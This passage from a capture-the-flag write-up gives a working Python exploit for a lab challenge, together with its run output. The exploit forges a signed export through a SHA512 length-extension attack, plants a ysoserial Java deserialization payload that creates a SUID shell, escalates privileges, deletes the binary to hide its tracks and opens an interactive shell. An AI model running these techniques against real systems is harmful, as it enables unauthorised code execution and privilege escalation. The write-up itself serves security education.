    log.info('Successfully entered the party.')
```

To fill out the last SHA512 block so that the length extension attack is easier to pull off, we set
the `name` field to 128 'A's.

```python
    # Set a name of at least the SHA512 block size.
    c.recvuntil(b'Choice: ')
    name = b'A' * (1024//8)
    c.sendline('1')
    c.sendline(name)
    c.recvuntil(b'Name set!')
    log.info('Successfully set a new name to ensure a large enough input size.')
```

Now, to append a Base64 tail to the end of the original data, we want to avoid padding in the front
segment. To do this, we adjust the length of the `captions` field until we get an export that does
not contain any padding. We keep track of this exported cake for later use.

```python
    # Set a caption until the base64 cake output requires no padding.
    log.info('Looking for a suitable cake export...')
    cake_struct = None
    caption_length = 0
    while True:
        # Get the current exported cake.
        c.recvuntil(b'Choice: ')
        c.sendline(b'7')
        c.recvuntil(b"Here's your cake to go:\n")
        json_data = c.recvuntil(b'\n').strip()
        cake_struct = json.loads(json_data)
        cake_base64 = binascii.unhexlify(cake_struct['cake'])

        # Print some information.
        log.info("Caption Length: {}".format(caption_length))
        log.info("Cake: {}".format(cake_base64.decode('ascii')))
        log.info("Digest: {}".format(cake_struct['digest']))

        # If it meets the constraints, then break immediately.
        if cake_base64[-1] != ord(b'='):
            break

        # Otherwise, add more captions.
        c.recvuntil(b'Choice: ')
        c.sendline(b'3')
        caption_length += 1
        caption = b'B' * caption_length
        c.sendline(caption)
        c.recvuntil(b'Caption set!')
```

Then, we call the modified ysoserial to generate the payload for another SUID shell that allows us
to escalate to the `hatter` user.

```python
    # Generate the deserialization payload.
    log.info('Generating FST Deserialization payload to create a hatter SUID binary.')
    fst_payload = subprocess.check_output(
        ['java', '-jar', 'ysoserial-fst-private-master/target/ysoserial-0.0.6-SNAPSHOT-all.jar',
         '-fst', 'CommonsBeanutils1',
         'bash -c {cp,/bin/sh,/tmp/hackers_use_me/pwn2};{chmod,+s,/tmp/hackers_use_me/pwn2}'],
        stderr=subprocess.DEVNULL
    )
```

Now the protobuf serialized fireworks field is forged using the utilities and layout we defined
earlier.

```python
    # Generate the protobuf serialized fireworks field
    #     repeated bytes fireworks = 5;
    # From https://developers.google.com/protocol-buffers/docs/encoding#structure:
    # The wire type of the length-delimited fields like bytes is 2.
    # After the key, the length of the bytes is encoded as a varint.
    log.info('Constructing the protobuf field from scratch.')
    fireworks_payload = encode_key(5, 2)
    fireworks_payload += encode_varint(len(fst_payload))
    fireworks_payload += fst_payload
    fireworks_encoded = base64.b64encode(fireworks_payload)
```

Using the Python API for HashPump, we can generate the forged hash digest and the resultant data
containing the original Base64 data, some padding, and our forged Base64 data.

```python
    # Forge the digest with the hash length extension attack.
    # The key length is known to be 32 from the App.java key length check.
    log.info('Forging the new cake and digest with the malicious fireworks field.')
    forged_digest, forged_data = hashpumpy.hashpump(cake_struct['digest'], cake_base64,
                                                    fireworks_encoded, 32)
```

A new cake JSON structure is created from the HashPump output.

```python
    # Construct the new exported cake.
    new_cake = {
        'digest': forged_digest,
        'cake': binascii.hexlify(forged_data).decode('raw_unicode_escape')
    }
    new_cake_json = json.dumps(new_cake)
    log.success('New Cake JSON forged successfully!')
```

The forged cake JSON is now sent to the application to import.

```python
    # Send the forged JSON.
    log.info('Sending the forged JSON.')
    c.recvuntil(b'Choice: ')
    c.sendline(b'8')
    c.recvuntil(b'Please enter your saved cake: ')
    c.sendline(new_cake_json)
    c.recvuntil(b'Cake successfully gotten!')
```

Now the cake is eaten to trigger the deserialization. After triggering it, the application is exited
back to the `mouse` shell.

```python
    # Trigger the deserialization and get RCE as hatter.
    # The service should crash.
    log.info('Triggering the deserialization to create the hatter SUID binary...')
    c.recvuntil(b'Choice: ')
    c.sendline(b'9')
    c.recvuntil(b'Hope you had fun! Bad day!')
    c.sendline(b'\n\n')
```

The SUID binary is executed to gain a shell as the `hatter` user and its cleaned up immediately.

```python
    # Drop into the hatter suid shell.
    log.info('Triggering the SUID binary to escalate to the hatter user.')
    c.sendline(b'/tmp/hackers_use_me/pwn2 -p')
    # Remove the binary.
    log.info('Removing the SUID binary to clean up the tracks.')
    c.sendline(b'rm /tmp/hackers_use_me/pwn2')
```

Finally, the flag is retrieved and an interactive shell is dropped.

```python
    # Get the flag.
    log.info('Reading the flag at /home/hatter/flag4')
    log.success('Flag 4:')
    c.sendline('cat /home/hatter/flag4')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()
```

Running the exploit:

```shell
root@58cc9472a197:/opt/wonderland# ./4_a_mad_tea_party.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[ ] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Teleporting to under-a-giant-mushroom to get the golden-hookah...
[*] Teleporting to /opt/wonderland/logs
[*] Generating pickle RCE payload...
[*] Writing payload to 9194cba7-4819-495c-a0c1-e15687656477.item
[*] Triggering RCE...
[*] Constructing pool-of-tears exploit URL.
[*] Sending curl request to trigger the creation of the SUID binary.
[*] Triggering the SUID binary to escalate to the mouse user.
[*] Removing the SUID binary to clean up the tracks.
[*] Reading the invitation code...
[+] Got invitation code: b320520d-eb5b-4c33-9257-a7ba0f55707c
[*] Successfully entered the party.
[*] Successfully set a new name to ensure a large enough input size.
[*] Looking for a suitable cake export...
[*] Caption Length: 0
[*] Cake: CoABQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEQ6fQBIgdWYW5pbGxh
[*] Digest: ef765522f196f3f4a8375a91231dc465b39106fafd3acf9b538b9ba9445691dd2da9cac8eec7e0de23f5f3e101eb4489d9a4751f3c3c2c13e6100d3e4b539fc5
[*] Generating FST Deserialization payload to create a hatter SUID binary.
[*] Constructing the protobuf field from scratch.
[*] Forging the new cake and digest with the malicious fireworks field.
./4_a_mad_tea_party.py:226: DeprecationWarning: PY_SSIZE_T_CLEAN will be required for '#' formats
  forged_digest, forged_data = hashpumpy.hashpump(cake_struct['digest'], cake_base64,
[+] New Cake JSON forged successfully!
[*] Sending the forged JSON.
[*] Triggering the deserialization to create the hatter SUID binary...
[∧] Waiting a moment to return back to the shell context...
[*] Triggering the SUID binary to escalate to the hatter user.
[*] Removing the SUID binary to clean up the tracks.
[*] Reading the flag at /home/hatter/flag4
[+] Flag 4:
[+]
    TISC{flag4}
[+] Enjoy your shell!
[*] Switching to interactive mode

$ id
uid=1000(rabbit) gid=1000(rabbit) euid=1002(hatter) egid=1002(hatter) groups=1002(hatter)
$
```

A congratulation message can be found at `/home/hatter` to conclude things.

```shell
$ cat congratulations.txt
Congratulations Alice!

You have reached the end of this challenge.

You may rest for now but many stories await in the future!

- Cheshire
$
```

The full exploit can be found in `4_a_mad_tea_party.py`.
